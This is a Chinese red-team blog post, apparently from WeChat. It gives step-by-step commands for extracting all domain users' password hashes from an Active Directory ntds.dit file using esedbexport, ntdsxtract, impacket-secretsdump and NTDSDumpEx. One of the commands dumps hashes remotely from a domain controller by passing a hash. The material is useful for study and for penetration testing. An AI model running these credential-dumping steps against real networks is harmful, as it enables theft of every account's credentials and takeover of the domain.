> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vLdl0NYcANHK_2NYGEwyNA)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **33** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

**esedbexport 恢复 ntds.dit**

#### 导出 ntds.dit

用 kali 下载工具安装：

```
#下载libesedb
wget https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz

#安装依赖环境
apt-get install autoconf automake autopoint libtool pkg-config

#对libesedb进行编译和安装
./configure
make
sudo make install
sudo ldconfig
```

安装完后，会在系统的 /usr/local/bin 目录下看到 esedbexport 程序。

在 Kali 中，进入到存放 ntds.dit 文件的目录，使用 esedbexport 进行恢复操作：（操作时间需要根据 ntds.dit 的大小而定）

```
esedbexport -m tables ntds.dit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLEXAC3JV0NiawdF4KndP3AkEScdBkOtIqt9XibUiaTrSTD9W10QwptdqaE8ibamt5FNTj3RZyiazysWPg/640?wx_fmt=png)

提取成功，会在当前路径下生成一个 ntds.dit.export 的目录：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLEXAC3JV0NiawdF4KndP3AkegTpZBaHRjygiaPgDW3wkFUMqYQaZD3fSia8kAL4BtetW137A4iaW8ickw/640?wx_fmt=png)

我们只需要 datatable 和 link_table 。  

**导出域内所有哈希值**

#### ntdsxtract 导出散列值

在 kali 里使用命令安装 ntdstract：

```
#工具下载
git clone https://github.com/csababarta/ntdsxtract.git
#工具安装
python setup.py build && python setup.py install
```

首先，将导出的 ntds.dit.export 文件夹和 SYSTEM 文件夹一并放入 ntdsxtract 文件夹。

然后将域内的所有用户名及散列值导出到 all_user.txt 中：

```
dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLEXAC3JV0NiawdF4KndP3AkELZPtQcxhlDzScpfr9rVR06JgFdwicDDFNdWlribribY0gOgsO5DedsJA/640?wx_fmt=png)

ntds.dit 包含域内所有信息，可以通过分析 ntds.dit 导出域内的计算机信息及其他信息：

```
dscomputers.py ntds.dit.export/datatable.3 comupter_output --csvoutfile all_computers.csv
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLEXAC3JV0NiawdF4KndP3Ak1TEhabbTmrLrCMj89rnd5MTV5ngpskXKwpBp84IXQNdVeNkh0VA7xw/640?wx_fmt=png)

**impacket 导出域内所有哈希值**

工具下载地址：https://github.com/SecureAuthCorp/impacket

使用 impacket 工具包中的 secretdump，可以解析 ntds.dit 文件，导出散列值。

在 kali 中安装：

```
#下载
git clone https://github.com/SecureAuthCorp/impacket
#安装
python setup.py install
```

导出 ntds.dit 中所有的散列值：

```
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLEXAC3JV0NiawdF4KndP3AkJVicALcwGibRq4Sy10hrBVBkqf4dcxX4yHTWtbLQeIglzZgrml76wKlw/640?wx_fmt=png)

impacket 还可以直接通过用户名和散列值进行验证，从远程域控制器中读取 ntds.dit 并转储域散列值，命令如下：

```
impacket-secretsdump -hashes LM HASH:NT HASH -just-dc god.org/administrator@192.168.2.25

impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7 -just-dc god.org/administrator@192.168.2.25
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLEXAC3JV0NiawdF4KndP3AkwXlESju3kALCsib4BpqXknqtF6oZZSFhpMoQlH2hvMnSiaGAT0rB9cfQ/640?wx_fmt=png)

* * *

**Windows 下解析 ntds.dit 并导出域账号和域哈希值**

使用 NTDSDumpex.exe 可以导出 散列值的操作。

```
NTDSDumpex.exe  下载地址：
https://github.com/zcgonvh/NTDSDumpEx/releases/download/v0.3/NTDSDumpEx.zip
```

将 ntds.dit、SYSTEM 和 NTDSDumpex.exe 放在同一目录下运行命令：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLEXAC3JV0NiawdF4KndP3AkZMPg7w2TdiaAqRjg5fnnMCeqctRaL69MOZJTbcYibeuWfuEqnpe5iaz4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看